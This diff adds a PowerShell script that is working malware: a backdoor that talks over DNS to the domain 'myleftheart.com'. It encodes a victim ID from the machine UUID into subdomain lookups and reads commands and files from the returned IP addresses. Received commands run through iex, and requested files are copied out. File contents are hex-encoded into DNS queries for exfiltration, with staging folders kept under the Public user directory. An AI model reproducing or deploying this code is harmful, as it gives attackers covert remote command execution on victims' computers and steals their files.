@@ -1,0 +1,289 @@
+$CCA = "myleftheart.com";
+$DDA = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{ "atag12" + $_.replace('-','') }| %{$_ + "1234567890"} | %{$_.substring(0,10)}
+
+function EEA ($FFA, $GGA, $HHA, $IIA, $JJA)
+{
+	$KKA = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ });
+	$LLA = Get-Random -InputObject (0 .. 9) -Count 2;
+	$MMA = $DDA.Insert(($LLA[1]), $GGA).Insert($LLA[0], $FFA);
+	write-host $DDA;
+	if ($JJA -eq "s")
+	{ return "$($MMA)$($KKA)A$($LLA[0])$($LLA[1])7.$HHA.$IIA.$CCA"; }
+	else 
+	{ return "$($MMA)$($KKA)A$($LLA[0])$($LLA[1])7.$($CCA)";}
+}
+function receive
+{
+	$NNA = $false;
+	$OOA = 0;
+	$PPA = ${global:$QQA} + "\";
+	$RRA = @();
+	$SSA = "000";
+	$TTA = "0";
+	${global:$UUA} = $true;
+	
+	${global:$exception_countersss} = 0;
+	${global:$exception_count_limitsss} = 2;
+	
+	While (${global:$UUA})
+	{
+		if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break }
+		Start-Sleep -m 100;
+		if ($OOA -lt 10) { $SSA = "00$($OOA)"; }
+		elseif ($OOA -lt 100) { $SSA = "0$($OOA)"; }
+		else { $SSA = "$($OOA)"; }
+		$VVA = EEA $SSA $TTA "" "" "r"
+		try
+		{
+			Write-Host $VVA;
+			$WWA = [System.Net.Dns]::GetHostAddresses($VVA);
+			Write-Host $WWA;
+		}
+		catch [Exception]
+		{
+			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue;
+		}
+		
+		if ($WWA -eq $null)
+		{
+			${global:$exception_countersss} = ${global:$exception_countersss} + 1;
+			continue;
+		}
+		$XXA = $WWA[0].IPAddressToString.Split('.');
+		Write-Host "$($OOA):$($XXA[3])`tsaveing_mode: $($NNA)`t   $($XXA[0]) $($XXA[1]) $($XXA[2])"
+		
+		if (($XXA[0] -eq 1) -and ($XXA[1] -eq 2) -and ($XXA[2] -eq 3))
+		{
+			$NNA = $false;
+			$TTA = "0";
+			$len = $RRA.Length
+			if ($RRA[$len-1] -eq 0 -and $RRA[$len-2] -eq 0)
+			{
+				$YYA = $RRA[0 .. ($len - 3)];
+			}
+			elseif ($RRA[$len - 1] -eq 0)
+			{
+				$YYA = $RRA[0 .. ($len - 2)];
+			}
+			else
+			{
+				$YYA = $RRA;
+			}
+			[System.IO.File]::WriteAllBytes($PPA, $YYA);
+			$RRA = @();
+			$YYA = @();
+			$OOA = 0;
+			${global:$UUA} = $false;
+		}
+		
+		if ($NNA)
+		{
+			if ($OOA -gt 250) { $OOA = 0; }
+			if ($OOA -eq $XXA[3])
+			{
+				$RRA += $XXA[0];
+				$RRA += $XXA[1];
+				$RRA += $XXA[2];
+				$OOA = $OOA + 3;
+			}
+		}
+		
+		if (($XXA[0] -eq 24) -and ($XXA[1] -eq 125))
+		{
+			$PPA += $XXA[2] + "" + $XXA[3];
+			$NNA = $true;
+			$TTA = "1";
+			$OOA = 0;
+		}
+		
+		if (($XXA[0] -eq 11) -and ($XXA[1] -eq 24) -and ($XXA[2] -eq 237) -and ($XXA[3] -eq 110)) # kill this process
+		{
+			${global:$UUA} = $false;
+			${global:$exception_countersss} = ${global:$exception_countersss} + 1;
+		}
+	}
+	Start-Sleep -s 1;
+}
+
+
+
+
+function send
+{
+	$OOA = 0;
+	$ZZA = @(Get-ChildItem -Path ${global:$AAB} | Where-Object { !$_.PSIsContainer });
+	if ($ZZA -ne $null)
+	{
+		$BBB = ${global:$AAB} + "\" + $ZZA[0];
+		$CCB = slaber $BBB;
+		if ([int]$CCB.Length -le 0)
+		{
+			Remove-Item -Path $BBB;
+			return;
+		}
+		$DDB = 60;
+		$EEB = "*" * 54;
+		$EEB = Split-Path $BBB -Leaf | % { $EEB.Insert(0, $_) } | % { $_.Insert(6, $CCB.Length) } | %{$_[0..26] -join ""};
+		$EEB = -join ($EEB | % { resolver $_ })
+		$FFB = "bWV0YT" + $EEB;
+		$CCB = $FFB + $CCB;
+		$GGB = "000";
+		$TTA = "2";
+		$HHB = 0;
+		${global:$UUA} = $true;
+		
+		${global:$exception_countersss} = 0;
+		${global:$exception_count_limitsss} = 2;
+		
+		While (${global:$UUA})
+		{
+			if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break; }
+			Start-Sleep -m 100;
+			if ($OOA -eq 250) { $OOA = 0; $HHB += 250; }
+			if ($OOA -lt 10) { $GGB = "00$($OOA)"; }
+			elseif ($OOA -lt 100) { $GGB = "0$($OOA)"; }
+			else { $GGB = "$($OOA)"; }
+			
+			if ($CCB.Length -gt $DDB)
+			{
+				if (($CCB.Length - $DDB * ($OOA + $HHB)) -ge $DDB)
+				{
+					$IIB = $CCB.Substring($DDB * ($OOA + $HHB), $DDB);
+				}
+				elseif (($CCB.Length - $DDB * ($OOA + $HHB)) -gt 0)
+				{
+					$IIB = $CCB.Substring($DDB * ($OOA + $HHB), ($CCB.Length - $DDB * ($OOA + $HHB)));
+				}
+				else
+				{
+					$IIB = "bWV0YTZW5k";
+					${global:$UUA} = $false;
+					Remove-Item -path $BBB -Force;
+				}
+			}
+			else
+			{
+				$IIB = $CCB;
+			}
+			$JJB = (Split-Path $BBB -Leaf) + "*" | % { resolver $_ };
+			$VVA = EEA $GGB $TTA $IIB $JJB "s"
+			Write-Host "$($IIB)`t$($VVA)"
+			try
+			{
+				$WWA = [System.Net.Dns]::GetHostAddresses($VVA);
+			}
+			catch { Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue; }
+			
+			if ($WWA -eq $null) { ${global:$exception_countersss} = ${global:$exception_countersss} + 1;continue }
+			$XXA = $WWA[0].IPAddressToString.Split('.');
+			Write-Host "$($OOA):$($XXA[3])`tsaveing_mode: $($NNA)`t   $($XXA[0]) $($XXA[1]) $($XXA[2])"
+			
+			if (($XXA[0] -eq 1) -and ($XXA[1] -eq 2) -and ($XXA[2] -eq 3))
+			{
+				$OOA = [int]$XXA[3];
+			}
+			
+			if (($XXA[0] -eq 11) -and ($XXA[1] -eq 24) -and ($XXA[2] -eq 237) -and ($XXA[3] -eq 110)) # kill this process
+			{
+				$HHB = 0
+				${global:$UUA} = $false;
+				${global:$exception_countersss} = ${global:$exception_countersss} + 3;
+				del $BBB;
+			}
+		}
+	}
+}
+function slaber ($KKB) {
+	if ((Get-Item $KKB).length -gt 600kb)
+	{
+		"result size exceeded the maximum size and it deleted" | Set-Content $KKB;
+	}
+	$f = Get-Content $KKB -Encoding Byte;
+	$e = resolver($f);
+	return $e;
+}
+function resolver ($LLB) {
+	$cnt = 0;
+	$p1 = "";
+	$p2 = "";
+	for ($i = 0; $i -lt $LLB.Length; $i++)
+	{
+		if ($cnt -eq 30)
+		{
+			$cnt = 0;
+			$res += ($p1 + $p2);
+			$p1 = ""; $p2 = "";
+		}
+		$tmp = [System.BitConverter]::ToString($LLB[$i]).Replace("-", "");
+		$p1 += $tmp[0];
+		$p2 += $tmp[1];
+		$cnt++;
+	}
+	$res += ($p1 + $p2);
+	return $res;
+}
+function processor
+{
+	$ZZA = @(Get-ChildItem -Path ${global:$QQA} | Where-Object { !$_.PSIsContainer });
+	if ($ZZA -ne $null)
+	{
+		$BBB = ${global:$QQA} + "\" + $ZZA[0];
+		$MMB = $BBB -replace "receivebox", "sendbox";
+		
+		if ($BBB.EndsWith("0"))
+		{
+			$NNB = Get-Content $BBB | ? { $_.trim() -ne "" };
+			$OOB = ${global:$AAB} + "\" + $ZZA[0];
+			$NNB = $NNB | ? { $_.trim() -ne "" }
+			$PPB += $NNB+"\n";
+			$PPB += $NNB.Split("&") | foreach-object { Try { $_ | iex | Out-String } Catch { $_ | Out-String} }
+			$PPB +"<>" | Set-Content $OOB -Encoding UTF8
+			if (Test-Path -Path $BBB)
+			{
+				Remove-Item -path $BBB;
+			}
+		}
+		elseif ($BBB.EndsWith("1"))
+		{
+			$QQB = Get-Content $BBB | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() }
+			if (Test-Path -Path $QQB)
+			{
+				$OOB = ${global:$AAB} + "\" + $ZZA[0];
+				Copy-Item -path $QQB -destination $OOB -Force;
+			}
+			else
+			{
+				"File not exist" | Set-Content $MMB;
+			}
+			if (Test-Path -Path $BBB)
+			{
+				Remove-Item -path $BBB;
+			}
+		}
+		elseif ($BBB.EndsWith("2"))
+		{
+			$RRB = $BBB -replace "receivebox", "done";
+			Move-Item -path $BBB -destination $RRB -Force;
+			if (Test-Path -Path $RRB)
+			{
+				("200<>" + $RRB) | Set-Content $MMB;
+				Remove-Item -path $BBB;
+			}
+		}
+	}
+}
+
+${global:$SSB} = $env:PUBLIC + "\Public\"+ $DDA;
+${global:$QQA} = ${global:$SSB} + "\receivebox";
+${global:$AAB} = ${global:$SSB} + "\sendbox";
+${global:$TTB} = ${global:$SSB} + "\done";
+if (-not (Test-Path -Path ${global:$SSB}) -or -not (Test-Path -Path ${global:$AAB}))
+{
+	md ${global:$SSB};
+	md ${global:$AAB};
+	md ${global:$QQA};
+	md ${global:$TTB};
+}
+receive;
+processor;
+send;
